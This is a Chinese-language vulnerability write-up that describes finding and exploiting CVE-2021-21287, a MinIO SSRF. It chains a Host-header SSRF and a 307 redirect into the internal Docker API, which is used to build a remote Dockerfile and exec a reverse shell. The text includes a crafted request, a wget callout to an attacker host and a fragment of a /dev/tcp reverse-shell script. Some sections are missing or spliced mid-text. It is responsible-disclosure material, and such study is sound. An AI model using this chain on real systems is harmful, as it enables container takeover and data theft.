@@ -1,0 +1,102 @@
+**作者： phith0n  
+原文链接：**
+>
+> 事先声明：本次测试过程完全处于本地或授权环境，仅供学习与参考，不存在未授权测试过程。本文提到的漏洞《MinIO未授权SSRF漏洞（CVE-2021-21287）》已经修复，也请读者勿使用该漏洞进行未授权测试，否则作者不承担任何责任。
+随着工作和生活中的一些环境逐渐往云端迁移，对象存储的需求也逐渐多了起来，MinIO就是一款支持部署在私有云的开源对象存储系统。MinIO完全兼容AWS
+S3的协议，也支持作为S3的网关，所以在全球被广泛使用，在Github上已有25k星星。
+我平时会将一些数据部署在MinIO中，在CI、Dockerfile等地方进行使用。本周就遇到了一个环境，其中发现一个MinIO，其大概情况如下：
+  * MinIO运行在一个小型Docker集群（swarm）中 
+  * MinIO开放默认的9000端口，外部可以访问，地址为`http://192.168.227.131:9000`，但是不知道账号密码 
+  * `192.168.227.131`这台主机是CentOS系统，默认防火墙开启，外部只能访问9000端口，dockerd监听在内网的2375端口（其实这也是一个swarm管理节点，swarm监听在2377端口） 
+本次测试目标就是窃取MinIO中的数据，或者直接拿下。
+## 0x01 MinIO代码审计
+既然我们选择了从MinIO入手，那么先了解一下MinIO。其实我前面也说了，因为平时用到MinIO的时候很多，所以这一步可以省略了。其使用Go开发，提供HTTP接口，而且还提供了一个前端页面，名为“MinIO
+Browser”。当然，前端页面就是一个登陆接口，不知道口令无法登录。
+那么从入口点（前端接口）开始对其进行代码审计吧。
+在User-Agent满足正则`.*Mozilla.*`的情况下，我们即可访问MinIO的前端接口，前端接口是一个自己实现的JsonRPC：
+我们感兴趣的就是其鉴权的方法，随便找到一个RPC方法，可见其开头调用了`webRequestAuthenticate`，跟进看一下，发现这里用的是jwt鉴权：
+jwt常见的攻击方法主要有下面这几种：
+  * 将alg设置为None，告诉服务器不进行签名校验 
+  * 如果alg为RSA，可以尝试修改为HS256，即告诉服务器使用公钥进行签名的校验 
+  * 爆破签名密钥 
+查看MinIO的JWT模块，发现其中对alg进行了校验，只允许以下三种签名方法：
+这就堵死了前两种绕过方法，爆破当然就更别说了，通常仅作为没办法的情况下的手段。当然，MinIO中使用用户的密码作为签名的密钥，这个其实会让爆破变的简单一些。
+鉴权这块没啥突破，我们就可以看看，有哪些RPC接口没有进行权限验证。
+很快找到了一个接口，`LoginSTS`。这个接口其实是AWS
+STS登录接口的一个代理，用于将发送到JsonRPC的请求转变成STS的方式转发给本地的9000端口（也就还是他自己，因为它是兼容AWS协议的）。
+简化其代码如下：
+    // LoginSTS - STS user login handler.
+    func (web *webAPIHandlers) LoginSTS(r *http.Request, args *LoginSTSArgs, reply *LoginRep) error {
+     ctx := newWebContext(r, args, "WebLoginSTS")
+     v := url.Values{}
+     v.Set("Action", webIdentity)
+     v.Set("WebIdentityToken", args.Token)
+     v.Set("Version", stsAPIVersion)
+     scheme := "http"
+        // ...
+     u := &url.URL{
+      Scheme: scheme,
+      Host:   r.Host,
+     }
+     u.RawQuery = v.Encode()
+     req, err := http.NewRequest(http.MethodPost, u.String(), nil)
+     // ...
+    }
+没发现有鉴权上的绕过问题，但是发现了另一个有趣的问题。这里，MinIO为了将请求转发给“自己”，就从用户发送的HTTP头Host中获取到“自己的地址”，并将其作为URL的Host构造了新的URL。
+这个过程有什么问题呢？
+因为请求头是用户可控的，所以这里可以构造任意的Host，进而构造一个SSRF漏洞。
+我们来实际测试一下，向`http://192.168.227.131:9000`发送如下请求，其中Host的值是我本地ncat开放的端口（`192.168.1.142:4444`）：
+    POST /minio/webrpc HTTP/1.1
+    Host: 192.168.1.142:4444
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
+    Content-Type: application/json
+    Content-Length: 80
+    {"id":1,"jsonrpc":"2.0","params":{"token":  "Test"},"method":"web.LoginSTS"}
+成功收到请求：
+可以确定这里存在一个SSRF漏洞了。
+## 0x02 升级SSRF漏洞
+仔细观察，可以发现这是一个POST请求，但是Path和Body都没法控制，我们能控制的只有URL中的一个参数`WebIdentityToken`。
+但是这个参数经过了URL编码，无法注入换行符等其他特殊字符。这样就比较鸡肋了，如果仅从现在来看，这个SSRF只能用于扫描端口。我们的目标当然不仅限于此。
+幸运的是，Go默认的http库会跟踪302跳转，而且不论是GET还是POST请求。所以，我们这里可以302跳转来“升级”SSRF漏洞。
+使用PHP来简单地构造一个302跳转：
+     “The 307 (Temporary Redirect) status code indicates that the target resource
+> resides temporarily under a different URI and the user agent **MUST NOT**
+> change the request method if it performs an automatic redirection to that
+> URI.”
+307跳转的特点就是 **不会**
+改变原始请求的方法，也就是说，在服务端返回307状态码的情况下，客户端会按照Location指向的地址发送一个相同方法的请求。
+我们正好可以利用这个特性，来获得POST请求。
+简单修改一下之前的index.php：
+     “
+>
+> A Git repository URI or HTTP/HTTPS context URI. If the URI points to a
+> single text file, the file’s contents are placed into a file called
+> `Dockerfile` and the image is built from that file. If the URI points to a
+> tarball, the file is downloaded by the daemon and the contents therein used
+> as the context for the build. If the URI points to a tarball and the
+> `dockerfile` parameter is also specified, there must be a file with the
+> corresponding path inside the tarball.
+>
+> ”
+这个参数可以传入一个Git地址或者一个HTTP URL，内容是一个Dockerfile或者一个包含了Dockerfile的Git项目或者一个压缩包。
+也就是说，Docker API支持通过指定远程URL的方式来构建镜像，而不需要我在本地写入一个Dockerfile。
+所以，我尝试编写了这样一个Dockerfile，看看是否能够build这个镜像，如果可以，那么我的4444端口应该能收到wget的请求：
+    FROM alpine:3.13
+    RUN wget -T4 http://192.168.1.142:4444/docker/build
+然后修改前面的index.php，指向Docker集群的2375端口：
+    & /dev/tcp/192.168.1.142/4444 0>&1\"]}" | jq -r ".Id")'; \
+            echo 'curl -s -X POST "${target}/exec/${execid}/start" -H "Content-Type: application/json" --data-binary "{}"'; \
+        } | bash
+这个脚本所干的事情比较简单，一个是遍历了所有容器，如果发现其镜像的名字中包含`minio/minio`，则认为这个容器就是MinIO所在的容器。拿到这个容器的Id，用exec的API，在其中执行反弹shell的命令。
+最后成功拿到MinIO容器的shell：
+当然，我们也可以通过Docker API来获取集群权限，这不在本文的介绍范围内了。
+## 0x06 总结
+本次测试开始于一个MinIO开放的9000端口，通过代码审计，挖掘到了MinIO的一个SSRF漏洞，又利用这个漏洞攻击内网的Docker
+API，最终拿到了MinIO的权限。
+本文所涉及的漏洞已经提交给MinIO官方并修复，以下是时间线：
+  * Jan 23, 2021, 9:11 PM - 漏洞提交 
+  * Jan 24, 2021, 3:06 AM - 漏洞确认 
+  * Jan 26, 2021, 2:15 AM - 修复已被合并进主线分支 
+  * Jan 30, 2021, 11:22 AM - 漏洞公告和新版本被发布 
+  * Feb 2, 2021 01:10 AM - 确认编号 - CVE-2021-21287
+* * *
